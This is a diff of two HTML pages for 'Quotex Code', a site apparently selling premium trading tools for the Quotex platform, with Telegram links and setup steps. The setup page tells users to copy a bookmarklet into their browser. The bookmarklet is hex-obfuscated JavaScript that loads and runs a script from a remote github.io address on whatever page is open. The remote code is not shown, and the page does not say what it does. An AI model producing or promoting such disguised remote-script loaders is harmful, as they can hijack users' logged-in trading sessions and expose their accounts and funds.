@@ -1,3 +1,265 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Quotex Code - By Trader Siamx</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      color: #333;
+    }
+
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    header {
+      width: 100%;
+      height: 250px;
+      background-color: #000;
+      background-image: url('YOUR_HEADER_IMAGE_URL');
+      background-size: cover;
+      background-position: center;
+    }
+
+    .main {
+      text-align: center;
+      padding: 20px;
+    }
+
+    .main-icon {
+      background: #4b56e9;
+      width: 90px;
+      height: 90px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: -45px auto 20px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    }
+
+    .main-icon i {
+      font-size: 36px;
+      color: white;
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .badge {
+      background: #4b56e9;
+      color: white;
+      padding: 5px 12px;
+      border-radius: 15px;
+      font-size: 12px;
+      vertical-align: middle;
+    }
+
+    .author {
+      font-size: 20px;
+      font-weight: 600;
+      margin: 10px 0;
+    }
+
+    .desc {
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    .social-icons {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 30px;
+    }
+
+    .social-icons a {
+      background: #4b56e9;
+      color: white;
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      text-decoration: none;
+      transition: transform 0.3s ease, background-color 0.3s ease;
+    }
+
+    .social-icons a:hover {
+      background-color: #3742fa;
+      transform: scale(1.2) rotate(10deg);
+    }
+
+    .section {
+      padding: 30px 20px;
+      background: #f7f7f7;
+    }
+
+    .section h2 {
+      font-size: 22px;
+      margin-bottom: 10px;
+      color: #222;
+    }
+
+    .setup-box {
+      background: white;
+      border-left: 4px solid #4b56e9;
+      border-radius: 10px;
+      padding: 20px;
+      margin-bottom: 20px;
+      text-align: left;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+      transition: all 0.3s ease-in-out;
+    }
+
+    .setup-box:hover {
+      transform: translateY(-5px) scale(1.02);
+      box-shadow: 0 10px 20px rgba(0,0,0,0.15);
+    }
+
+    .setup-box h3 {
+      display: flex;
+      align-items: center;
+      font-size: 18px;
+    }
+
+    .setup-box h3 i {
+      margin-right: 10px;
+      color: #4b56e9;
+    }
+
+    .setup-box p {
+      margin: 10px 0;
+      color: #444;
+    }
+
+    .setup-box a {
+      display: inline-block;
+      padding: 10px 20px;
+      color: white;
+      text-decoration: none;
+      border-radius: 8px;
+      margin-top: 10px;
+      font-weight: 600;
+      transition: background 0.3s ease;
+    }
+
+    .btn-windows {
+      background-color: #2196f3;
+      box-shadow: 0 4px 6px rgba(33, 150, 243, 0.3);
+    }
+
+    .btn-windows:hover {
+      background-color: #1976d2;
+    }
+
+    .btn-android {
+      background-color: #4caf50;
+      box-shadow: 0 4px 6px rgba(76, 175, 80, 0.3);
+    }
+
+    .btn-android:hover {
+      background-color: #388e3c;
+    }
+
+    .btn-ios {
+      background-color: #ff9800;
+      box-shadow: 0 4px 6px rgba(255, 152, 0, 0.3);
+    }
+
+    .btn-ios:hover {
+      background-color: #f57c00;
+    }
+
+    .bookmarklet {
+      text-align: center;
+      padding: 30px 20px;
+    }
+
+    .bookmarklet a {
+      padding: 12px 20px;
+      background: #4b56e9;
+      color: white;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: background 0.3s ease;
+    }
+
+    .bookmarklet a:hover {
+      background: #3742fa;
+    }
+  </style>
+</head>
+<body>
+
+  <header></header>
+
+  <div class="container">
+    <div class="main">
+      <div class="main-icon">
+        <i class="fas fa-chart-line"></i>
+      </div>
+      <h1>Quotex Code <span class="badge">PREMIUM</span></h1>
+      <div class="author">By Trader Siam X</div>
+      <div class="desc">Professional Trading Tools and Indicators Setup</div>
+
+      <div class="social-icons">
+        <a href="https://t.me/TRADERSIAMX" target="_blank"><i class="fab fa-telegram-plane"></i></a>
+        <a href="https://t.me/+h23idKnNagRhYWQ1" target="_blank"><i class="fas fa-bullhorn"></i></a>
+        <a href="#" target="_blank"><i class="fab fa-youtube"></i></a>
+      </div>
+    </div>
+
+    <div class="section">
+      <h2><i class="fas fa-cog"></i> Setup Instructions</h2>
+      <p>Select your platform to view detailed setup instructions:</p>
+
+      <div class="setup-box">
+        <h3><i class="fab fa-windows"></i> Windows Setup</h3>
+        <p>Complete guide to install and configure on Windows devices.</p>
+        <a href="ui-setup.html" class="btn-windows"><i class="fas fa-play"></i> Watch Setup Video</a>
+      </div>
+
+      <div class="setup-box">
+        <h3><i class="fab fa-android"></i> Android Setup</h3>
+        <p>Step-by-step instructions for Android smartphones and tablets.</p>
+        <a href="ui-setup.html" class="btn-android"><i class="fas fa-play"></i> Watch Setup Video</a>
+      </div>
+
+      <div class="setup-box">
+        <h3><i class="fab fa-apple"></i> iOS Setup</h3>
+        <p>Installation guide for iPhone and iPad users.</p>
+        <a href="ui-setup.html" class="btn-ios"><i class="fas fa-play"></i> Watch Setup Video</a>
+      </div>
+    </div>
+
+    <div class="bookmarklet">
+      <a href="ui-setup.html"><i class="fas fa-bookmark"></i> Bookmarklet Setup</a>
+    </div>
+  </div>
+
+</body>
+</html>
+
+
+
+<!-- ui-setup.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -16,159 +278,93 @@
 
     body {
       font-family: 'Inter', sans-serif;
-      background: #f9f9ff;
-    }
-
-    .header {
-      width: 100%;
-      height: 250px;
-      background-image: url('https://wallpapercave.com/wp/wp11271970.jpg');
-      background-size: cover;
-      background-position: center;
-    }
-
-    .container {
-      max-width: 700px;
-      margin: -100px auto 40px;
       background: #fff;
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+      color: #222;
+      padding: 40px 20px;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+
+    h1 {
+      font-weight: 700;
+      font-size: 36px;
       text-align: center;
-    }
-
-    h2 {
-      color: #3b82f6;
-      font-size: 28px;
-      margin-bottom: 10px;
-    }
-
-    p {
-      font-size: 16px;
-      color: #4b5563;
-    }
-
-    .btn-bookmarklet {
-      background: none;
-      border: 2px dashed #3b82f6;
-      padding: 12px 24px;
-      font-size: 16px;
-      color: #3b82f6;
-      border-radius: 10px;
-      cursor: pointer;
-      margin-top: 15px;
-      transition: all 0.3s;
-    }
-
-    .btn-bookmarklet:hover {
-      background: #3b82f6;
-      color: white;
-    }
-
-    .instruction-box {
-      text-align: left;
-      margin-top: 30px;
-      background: #f1f5f9;
-      padding: 20px;
-      border-left: 4px solid #3b82f6;
-      border-radius: 10px;
-    }
-
-    .instruction-box h3 {
-      color: #1f2937;
-      margin-bottom: 10px;
-    }
-
-    ol {
-      padding-left: 20px;
-      margin-bottom: 15px;
+      margin-bottom: 30px;
+      color: #4b56e9;
     }
 
     textarea {
       width: 100%;
-      height: 150px;
-      background: #f3f4f6;
-      border: none;
-      border-radius: 8px;
-      padding: 10px;
+      height: 120px;
       font-family: monospace;
       font-size: 14px;
-      color: #111827;
+      padding: 15px;
+      border-radius: 12px;
+      border: 2px solid #4b56e9;
+      background: #f0f0f5;
+      color: #000;
       resize: none;
+    }
+
+    .code-label {
+      font-weight: 600;
+      margin-bottom: 10px;
+      color: #4b56e9;
     }
 
     .copy-btn {
       margin-top: 10px;
-      background: #10b981;
-      border: none;
+      background-color: #4b56e9;
       color: white;
-      padding: 10px 20px;
-      font-size: 14px;
-      border-radius: 8px;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 10px;
+      font-weight: 600;
       cursor: pointer;
-      transition: background 0.3s ease;
+      box-shadow: 0 6px 12px rgba(75, 86, 233, 0.6);
+      transition: background-color 0.3s ease;
+      display: block;
     }
 
     .copy-btn:hover {
-      background: #059669;
+      background-color: #3742fa;
     }
 
-    .back-btn {
-      margin-top: 30px;
-      display: inline-block;
-      text-decoration: none;
-      background: #e0e7ff;
-      color: #3b82f6;
-      padding: 10px 18px;
-      border-radius: 8px;
-      transition: all 0.3s;
-    }
-
-    .back-btn:hover {
-      background: #c7d2fe;
-    }
-
-    .icon {
-      margin-right: 6px;
+    .info {
+      margin-top: 25px;
+      font-size: 16px;
+      color: #444;
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <div class="header"></div>
 
-  <div class="container">
-    <h2>🔖 UI Setup</h2>
-    <p>Follow these instructions to install the bookmarklet on your device:</p>
+  <h1>UI Setup</h1>
 
-    <button class="btn-bookmarklet">✏️ Quotex Premium UI</button>
-
-    <div class="instruction-box">
-      <h3>💻 Desktop Instructions</h3>
-      <ol>
-        <li>Simply drag the button above to your UI bar</li>
-      </ol>
-
-      <h3>📱 Mobile Instructions</h3>
-      <ol>
-        <li>Bookmark this page in your browser</li>
-        <li>Edit the bookmark you just created</li>
-        <li>Replace the URL with the following code:</li>
-      </ol>
-
-      <textarea id="codeBox" readonly>
+  <div class="code-label">Copy the bookmarklet code below:</div>
+  <textarea id="bookmarklet-code" readonly>
 javascript:(function(){var _0x3afc=["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x69\x61\x6D\x7A\x73\x61\x2E\x67\x69\x74\x68\x75\x62\x2E\x69\x6F\x2F\x73\x69\x61\x6D\x78\x62\x75\x2F","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var _0x26c2=function(_0x3f4f4e,_0x4b51f5){_0x3f4f4e=_0x3f4f4e-0x0;var _0x316e2a=_0x3afc[_0x3f4f4e];return _0x316e2a;};var x=document[_0x26c2("0x0")]("script");x[_0x26c2("0x1")]=_0x26c2("0x2");document[_0x26c2("0x4")][_0x26c2("0x3")](x);})();
-      </textarea>
+  </textarea>
+  <button class="copy-btn" data-clipboard-target="#bookmarklet-code">Copy Code</button>
 
-      <button class="copy-btn" data-clipboard-target="#codeBox">
-        <i class="fas fa-copy icon"></i>Copy Code
-      </button>
-    </div>
-
-    <a href="#" class="back-btn"><i class="fas fa-arrow-left icon"></i> Back to Home</a>
-  </div>
+  <div class="info">Click the button above to copy the bookmarklet code. Then add it as a bookmark in your browser.</div>
 
   <script>
-    new ClipboardJS('.copy-btn');
+    var clipboard = new ClipboardJS('.copy-btn');
+
+    clipboard.on('success', function(e) {
+      e.trigger.textContent = 'Copied!';
+      setTimeout(() => {
+        e.trigger.textContent = 'Copy Code';
+      }, 2000);
+      e.clearSelection();
+    });
+
+    clipboard.on('error', function(e) {
+      alert('Failed to copy. Please copy manually.');
+    });
   </script>
+
 </body>
 </html>
